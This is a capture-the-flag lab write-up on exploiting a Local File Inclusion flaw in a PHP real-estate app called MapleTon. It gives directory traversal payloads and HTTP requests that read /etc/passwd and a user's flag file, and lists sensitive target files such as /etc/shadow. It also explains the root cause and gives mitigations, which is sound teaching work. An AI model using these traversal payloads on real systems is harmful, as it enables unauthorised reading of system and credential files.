---
title: "Local File Inclusion (LFI) to Sensitive File Disclosure | Mapleton"
date: 2026-05-12 11:20:00 +0530
categories: [A02 - Security Misconfiguration, Local File Inclusion]
tags: [lfi, local-file-inclusion, path-traversal, php, file-disclosure, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/mapleton-lfi.webp
  alt: MapleTon LFI exploitation walkthrough
---

# MapleTon

MapleTon is a vulnerable real-estate listing application where property pages are dynamically loaded using a user-controlled parameter. The application fails to properly validate file paths, resulting in a classic Local File Inclusion (LFI) vulnerability.

During testing, the `listing` parameter was found to directly include local files from the server filesystem. By exploiting directory traversal sequences, it became possible to read arbitrary files on the target system, eventually leading to disclosure of the flag stored in the realtor user's home directory.
## Lab Link

- Lab: [DocketHive – WebVerse](https://dashboard.webverselabs-pro.com/mystery-challenges/mapleton)

---

# Overview

The application exposes listing pages through the following endpoint:

```http
/listing.php?listing=12-elm-street.html
```

The value of the `listing` parameter appears to determine which file the server loads and renders.

Because user input was not sanitized or restricted, the parameter could be manipulated with traversal sequences such as:

```text
../../../../
```

This allowed arbitrary local file access on the underlying Linux system.

---

# Objective

- Identify the vulnerability in the `listing` parameter
- Confirm Local File Inclusion
- Enumerate sensitive system files
- Identify valid users on the system
- Retrieve the flag from the target user's home directory

---

# Reconnaissance

While browsing available houses and listings, the URL structure revealed a potentially vulnerable parameter:

```http
https://f6db2127-4065-mapleton-e35ed.events.webverselabs-pro.com/listing.php?listing=12-elm-street.html
```

The parameter directly referenced a filename, which strongly suggested the backend may be using PHP file inclusion functions such as:

```php
include($_GET['listing']);
```

or

```php
require($_GET['listing']);
```

Applications designed this way are frequently vulnerable to:

- Local File Inclusion (LFI)
- Directory Traversal
- Arbitrary File Read

---

# Testing for Local File Inclusion

To verify the issue, the `listing` parameter was modified to access `/etc/passwd`.

## Payload

```text
../../../../../../../../etc/passwd
```

## Request

```http
GET /listing.php?listing=../../../../../../../../etc/passwd HTTP/2
Host: f6db2127-4065-mapleton-e35ed.events.webverselabs-pro.com
```

---

# Proof of Vulnerability

The server successfully returned the contents of `/etc/passwd`.

Example output:

```text
realtor:x:1100:1100::/home/realtor:/bin/bash
```

This confirmed:

- The application was vulnerable to LFI
- Arbitrary file reads were possible
- A valid system user named `realtor` existed
- The user's home directory was `/home/realtor`

---

# Exploitation

After identifying the target user, the next step was to access sensitive files within the realtor's home directory.

A common target in CTF-style environments is a flag file.

## Payload

```text
../../../../../../../../home/realtor/flag.txt
```

## Request

```http
GET /listing.php?listing=../../../../../../../../home/realtor/flag.txt HTTP/2
Host: f6db2127-4065-mapleton-e35ed.events.webverselabs-pro.com
```

---

# Flag Disclosure

The application returned the contents of the flag file:

```text
WEBVERSE{....}
```

The vulnerability resulted in direct disclosure of sensitive local files from the server filesystem.

---

# Root Cause Analysis

The issue exists because the application accepts user-controlled file paths without proper validation or sanitization.

A vulnerable implementation typically resembles:

```php
<?php
include($_GET['listing']);
?>
```

Because no restrictions were enforced, attackers could traverse outside the intended directory using:

```text
../
```

This enabled arbitrary file access anywhere readable by the web server process.

---

# Impact

Successful exploitation of LFI vulnerabilities can lead to:

- Disclosure of sensitive files
- Exposure of application source code
- Credential leakage
- Configuration disclosure
- Session theft
- Log poisoning attacks
- Potential Remote Code Execution (RCE)

Common targets include:

```text
/etc/passwd
/etc/shadow
/home/*/
/var/log/
/proc/self/environ
```

---

# Mitigation

## Avoid Dynamic File Inclusion

Never directly include user-supplied paths.

### Unsafe

```php
include($_GET['listing']);
```

### Safer Approach

```php
$allowed = [
    "12-elm-street" => "listings/12-elm-street.html",
    "oak-house" => "listings/oak-house.html"
];

include($allowed[$_GET['listing']] ?? '404.html');
```

---

## Restrict Directory Access

Use strict allowlists and ensure user input cannot escape intended directories.

---

## Disable Dangerous Behaviors

Harden PHP configuration:

```ini
allow_url_include = Off
open_basedir = /var/www/html
```

---

## Validate and Normalize Paths

Use secure path validation before file operations.

---

# Real-World Insight

Local File Inclusion remains one of the most common vulnerabilities in legacy PHP applications, especially those built before modern secure development practices became standard.

Older applications frequently:

- Dynamically include files from URL parameters
- Lack input validation
- Trust client-controlled paths
- Reuse outdated PHP patterns

In real-world penetration tests, LFI vulnerabilities often become critical when combined with:

- Log poisoning
- File uploads
- PHP session manipulation
- `/proc` filesystem abuse

Even simple arbitrary file reads can expose credentials, API keys, SSH keys, and internal application logic.

---

# Key Takeaways

- User-controlled file paths are extremely dangerous
- Directory traversal sequences can escape intended directories
- `/etc/passwd` is a reliable indicator for LFI validation
- Enumerating users helps identify sensitive targets
- Arbitrary file read vulnerabilities can escalate significantly

